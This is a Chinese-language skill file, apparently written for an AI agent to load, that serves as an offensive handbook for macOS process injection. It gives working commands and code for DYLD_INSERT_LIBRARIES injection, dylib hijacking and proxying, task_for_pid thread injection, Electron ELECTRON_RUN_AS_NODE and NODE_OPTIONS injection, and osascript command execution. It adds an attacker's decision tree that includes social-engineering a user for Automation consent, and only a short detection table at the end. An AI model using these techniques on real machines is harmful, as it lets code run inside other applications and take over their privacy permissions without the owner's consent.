# 技能：macOS 进程注入 — 专家攻击手册

> **AI 加载指令**：专家级 macOS 进程注入技术。涵盖 DYLD_INSERT_LIBRARIES、dylib 劫持（弱引用/rpath/proxy）、XPC PID 重用攻击、Mach 端口操作、MIG 滥用和 Electron 注入。基础模型会忽略注入向量的权限要求（entitlement prerequisites）和系统完整性保护（SIP）限制。

## 0. 相关路由

深入学习前，请考虑加载：

- 当你需要绕过 TCC、Gatekeeper 或 SIP 阻止的注入时，加载 `[macos-security-bypass](../macos-security-bypass/SKILL.md)`
- 当需要进行 Unix 层级提权时，加载 `[linux-privilege-escalation](../linux-privilege-escalation/SKILL.md)`（共享对象劫持概念适用）

### 高级参考

当你需要以下内容时，也加载 `[DYLIB_XPC_TECHNIQUES.md](./DYLIB_XPC_TECHNIQUES.md)`：

- 带工具命令的 dylib 劫持分步方法论
- 带代码示例的 XPC 利用过程
- Mach 端口技术细节和 task_for_pid 模式

---

## 1. DYLD_INSERT_LIBRARIES 注入

最直接的注入方式：设置一个环境变量，强制动态链接器预加载你的 dylib。

### 1.1 要求和限制

| 条件 | 能否注入？ | 原因 |
|---|---|---|
| 普通二进制文件（非硬化） | 是 | 无限制 |
| 启用硬化运行时 | 否 | DYLD 会移除环境变量 |
| 硬化运行时 + `com.apple.security.cs.allow-dyld-environment-variables` | 是 | 权限明确允许 |
| Apple 系统二进制文件（受 SIP 保护） | 否 | SIP 会移除 DYLD 环境变量 |
| SUID/SGID 二进制文件 | 否 | 为权限安全，DYLD 会移除环境变量 |
| 启用 App Sandbox | 否 | Sandbox 阻止环境变量注入 |

### 1.2 基本注入

```bash
# 创建恶意 dylib
cat > inject.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void inject() {
    printf("[+] 注入到 PID %d\n", getpid());
    // 负载代码
}
EOF

# 为两个架构编译
gcc -dynamiclib -o inject.dylib inject.c -arch x86_64 -arch arm64

# 注入到目标
DYLD_INSERT_LIBRARIES=./inject.dylib /path/to/target
```

### 1.3 查找可注入目标

```bash
# 查找没有硬化运行时的应用程序
find /Applications -name "*.app" -exec sh -c '
  binary=$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)
  if [ -n "$binary" ]; then
    flags=$(codesign -d --verbose "$1/Contents/MacOS/$binary" 2>&1)
    echo "$flags" | grep -q "runtime" || echo "没有硬化运行时: $1"
  fi
' _ {} \;

# 查找具有 dyld 环境变量权限的应用程序
find /Applications -name "*.app" -exec sh -c '
  binary="$1/Contents/MacOS/"$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)
  codesign -d --entitlements :- "$binary" 2>/dev/null | \
    grep -q "allow-dyld-environment-variables" && echo "DYLD 可注入: $1"
' _ {} \;
```

---

## 2. DYLIB 劫持

利用动态链接器的库搜索顺序，加载攻击者控制的 dylib 而不是（或除了）合法的 dylib。

### 2.1 弱引用 dylib 劫持 (LC_LOAD_WEAK_DYLIB)

弱引用 dylib 是可选的——如果缺失，二进制文件仍然可以运行。如果你能将 dylib 放置在预期路径，它就会加载。

```bash
# 查找使用弱引用 dylib 的二进制文件
otool -l /path/to/binary | grep -A 2 LC_LOAD_WEAK_DYLIB

# 检查弱引用 dylib 是否实际存在
otool -L /path/to/binary | grep weak | while read lib rest; do
  [ ! -f "$lib" ] && echo "缺失（可劫持）: $lib"
done
```

### 2.2 @rpath 劫持

`@rpath` 从二进制文件中的 `LC_RPATH` 条目解析。如果更早的 rpath 目录可写，你可以将你的 dylib 放在那里。

```bash
# 列出 rpath 条目
otool -l /path/to/binary | grep -A 2 LC_RPATH

# 列出 rpath 相对路径 dylib 引用
otool -L /path/to/binary | grep @rpath

# 如果 rpath 包含可写目录（例如 app 的 Frameworks/）
# 放置与名称匹配的恶意 dylib
```

### 2.3 dylib 代理

用恶意 dylib 替换合法 dylib，该恶意 dylib 将所有导出转发到原始文件。

```bash
# 第一步：识别目标 dylib 及其导出
nm -gU /path/to/original.dylib | awk '{print $3}'

# 第二步：创建代理 dylib 重新导出所有内容
# 将原始文件移动到 original_real.dylib
# 创建代理：
cat > proxy.c << 'EOF'
__attribute__((constructor))
void payload() {
    // 恶意代码
}
EOF

gcc -dynamiclib -o hijacked.dylib proxy.c \
  -Wl,-reexport_library,/path/to/original_real.dylib \
  -arch x86_64 -arch arm64
```

### 2.4 依赖枚举

```bash
otool -L /path/to/binary              # 列出所有 dylib 依赖
otool -l /path/to/binary              # 完整加载命令（rpaths、弱引用等）
dyldinfo -print_dependencies /path/to/binary  # 详细依赖信息（Ventura 之前）
```

---

## 3. XPC 利用

XPC（跨进程通信）是 macOS 的主要进程隔离 IPC 机制。特权 XPC 服务是高价值目标。

### 3.1 XPC 服务发现

```bash
# 系统XPC服务
find /System/Library -name "*.xpc" -type d 2>/dev/null | head -20

# 第三方XPC服务
find /Library /Applications -name "*.xpc" -type d 2>/dev/null

# LaunchDaemon XPC服务（根级）
grep -r "MachServices" /Library/LaunchDaemons/*.plist 2>/dev/null
grep -r "MachServices" /System/Library/LaunchDaemons/*.plist 2>/dev/null
```

### 3.2 PID 重用攻击

XPC 连接通过 PID 验证时，容易受到竞争条件攻击：攻击者启动进程，PID 被检查并通过，攻击者进程退出，操作系统重用该 PID 为恶意进程。

| 验证方法 | 是否易受攻击 | 备注 |
|---|---|---|
| 基于PID的检查 | 是 | PID 在进程退出后会被重用 |
| 审计令牌 | 否 | 每个进程生命周期唯一，不会被重用 |
| 代码签名检查 | 否 | 验证签名身份 |
| 权限检查 | 否 | 检查进程权限 |

```
PID重用攻击的时间线：
1. 合法客户端（PID 1234）连接到XPC服务
2. XPC服务检查PID 1234 → 有效
3. 合法客户端退出（PID 1234被释放）
4. 攻击者快速创建进程获取PID 1234
5. 攻击者进程（现在PID 1234）发送恶意XPC消息
6. XPC服务信任PID 1234（缓存的验证）
```

### 3.3 XPC 客户端验证弱点

| 弱点 | 描述 | 利用方式 |
|---|---|---|
| 无客户端验证 | 服务接受任何连接 | 直接连接，发送命令 |
| 仅PID验证 | 易受竞争条件攻击 | PID重用攻击（§3.2） |
| 仅Bundle ID检查 | Bundle ID可伪造 | 创建具有匹配Bundle ID的应用 |
| 部分代码要求 | 缺少锚点检查 | 使用任何匹配部分要求的证书签名 |
| 错误进程上的权限检查 | 检查父进程而不是客户端 | 从授权父进程启动 |

---

## 4. Mach 端口操作

Mach 端口是底层内核级 IPC 原语，是 XPC 的基础。直接 Mach 端口访问可进行强大的注入。

### 4.1 Task 端口 (task_for_pid)

```c
// 需要root或taskgated权限
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);
if (kr == KERN_SUCCESS) {
    // 现在可以读取/写入目标进程内存
    // 可以通过thread_create_running注入线程
}
```

| 访问方法 | 要求 | 注入后能力 |
|---|---|---|
| `task_for_pid()` | root + 目标未受SIP保护 | 完全内存读写，线程注入 |
| `processor_set_tasks()` | root + `com.apple.system-task-ports` | 枚举所有task端口 |
| 异常端口 | 通过`task_set_exception_ports`设置 | 捕获目标崩溃，重定向执行 |
| 线程注入 | 获取task端口 | 在目标地址空间创建新线程 |

### 4.2 端口命名空间操作

| 技术 | 描述 |
|---|---|
| 端口名猜测 | Mach端口名是顺序整数——在某些上下文中可暴力破解 |
| `mach_port_insert_right` | 将发送权插入目标的命名空间（需要task端口） |
| Bootstrap服务器滥用 | 在合法服务之前注册服务名→拦截连接 |

---

## 5. MIG (MACH 接口生成器) 滥用

MIG 生成 Mach IPC 的 C 存根。MIG 服务器在其调度例程中可能有漏洞。

### 5.1 分析方法

```bash
# 在二进制中查找MIG子系统
nm /path/to/binary | grep _subsystem
strings /path/to/binary | grep "MIG"

# 识别MIG例程调度表
otool -tV /path/to/binary | grep -A 5 "server_routine"
```

### 5.2 常见MIG漏洞

| 漏洞 | 描述 |
|---|---|
| 缺少审计令牌验证 | MIG处理程序不验证发送者身份 |
| 类型混淆 | MIG反序列化信任客户端提供的类型描述符 |
| 端口生命周期问题 | MIG调用之间Mach端口使用后释放 |
| OOL（越界）内存滥用 | 超大OOL描述符→内核内存问题 |

---

## 6. ELECTRON / CHROMIUM 注入

许多 macOS 应用使用 Electron（Slack、Discord、VS Code、Teams 等）。Electron 应用暴露多个注入表面。

### 6.1 ELECTRON_RUN_AS_NODE

```bash
# 将Electron应用转换为普通Node.js运行时
ELECTRON_RUN_AS_NODE=1 "/Applications/Slack.app/Contents/MacOS/Slack" -e \
  "require('child_process').execSync('id').toString()"

# 这会继承应用的TCC权限！
# 如果Slack有相机/麦克风/屏幕录制权限，你的代码也会获得这些权限。
```

### 6.2 调试标志

```bash
# 在应用上打开Chrome DevTools协议
"/Applications/Target.app/Contents/MacOS/Target" --inspect=9229
# 然后连接：chrome://inspect 在Chrome浏览器中

# 在任何代码运行前中断
"/Applications/Target.app/Contents/MacOS/Target" --inspect-brk=9229
```

### 6.3 NODE_OPTIONS 注入

```bash
# 通过NODE_OPTIONS注入预加载脚本
echo 'require("child_process").execSync("id > /tmp/pwned")' > /tmp/preload.js
NODE_OPTIONS="--require /tmp/preload.js" "/Applications/Target.app/Contents/MacOS/Target"
```

### 6.4 Electron 熔断器

现代 Electron 应用使用“熔断器”禁用危险功能。检查熔断器状态：

| 熔断器 | 启用时（安全） | 禁用时（可利用） |
|---|---|---|
| `RunAsNode` | 去除`ELECTRON_RUN_AS_NODE` | 可以用应用作为Node.js |
| `EnableNodeCliInspectArguments` | 去除--inspect标志 | 可以附加调试器 |
| `EnableNodeOptionsEnvironmentVariable` | 去除NODE_OPTIONS | 可以注入预加载 |
| `OnlyLoadAppFromAsar` | 仅从.asar加载 | 可以替换JS文件 |

```bash
# 检查electron熔断器状态（需要npx @electron/fuses）
npx @electron/fuses read --app "/Applications/Target.app"
```

---

## 7. 应用脚本（Apple 事件）

```bash
# 通过osascript注入（如果存在自动化权限）
osascript -e 'tell application "Terminal" to do script "id > /tmp/pwned"'

# JavaScript for Automation (JXA)
osascript -l JavaScript -e '
  var app = Application("Terminal");
  app.doScript("id > /tmp/pwned");
'

# JXA带ObjC桥接（强大）
osascript -l JavaScript -e '
  ObjC.import("Cocoa");
  var task = $.NSTask.alloc.init;
  task.launchPath = "/bin/bash";
  task.arguments = ["-c", "id > /tmp/pwned"];
  task.launch;
'
```

---

## 8. 进程注入决策树

```
需要将代码注入到 macOS 进程
│
├── 目标使用 Electron？
│   ├── 熔断器禁用？→ ELECTRON_RUN_AS_NODE (§6.1)
│   ├── 可调试？→ --inspect 标志 (§6.2)
│   ├── NODE_OPTIONS 未移除？→ 预加载注入 (§6.3)
│   └── 所有熔断器启用？→ 检查 dylib 路径或 XPC
│
├── 目标具有 dylib 环境变量权限？
│   └── 是 → DYLD_INSERT_LIBRARIES (§1)
│
├── 目标有缺失或弱 dylib？
│   ├── LC_LOAD_WEAK_DYLIB 且库缺失？→ 放置 dylib (§2.1)
│   ├── @rpath 在搜索中第一个可写目录？→ rpath 劫持 (§2.2)
│   └── 已存在 dylib 在可写位置？→ dylib 代理 (§2.3)
│
├── 目标暴露 XPC 服务？
│   ├── 无客户端验证？→ 直接连接 (§3.3)
│   ├── 仅 PID 验证？→ PID 重用攻击 (§3.2)
│   └── 审计令牌验证？→ 需要不同向量
│
├── 有 root 访问？
│   ├── 目标未受 SIP 保护？→ task_for_pid 注入 (§4.1)
│   └── 受 SIP 保护？→ 需要先绕过 SIP (→ macos-security-bypass)
│
├── 可以使用 Apple 事件？
│   ├── 目标有自动化权限？→ osascript 注入 (§7)
│   └── 无权限？→ 社交工程获取 Automation 同意
│
└── 以上都不适用？
    ├── 检查 MIG 服务器漏洞 (§5)
    └── 查找 bootstrap 服务器名称冲突 (§4.2)
```

---

## 9. 检测与取证

| 证据 | 查找位置 |
|---|---|
| DYLD_INSERT_LIBRARIES 使用 | 进程环境 (`/proc/PID/environ`, `ps eww`) |
| 非预期 dylib 加载 | `vmmap PID` 或 `DYLD_PRINT_LIBRARIES=1` 输出 |
| XPC 连接异常 | Endpoint Security `es_event_type_t` XPC 事件 |
| Electron 调试端口打开 | `lsof -i :9229` |
| osascript 执行 | 统一日志：`log show --predicate 'process=="osascript"'` |
| 未签名代码执行 | `codesign --verify` 失败，Gatekeeper 日志 |
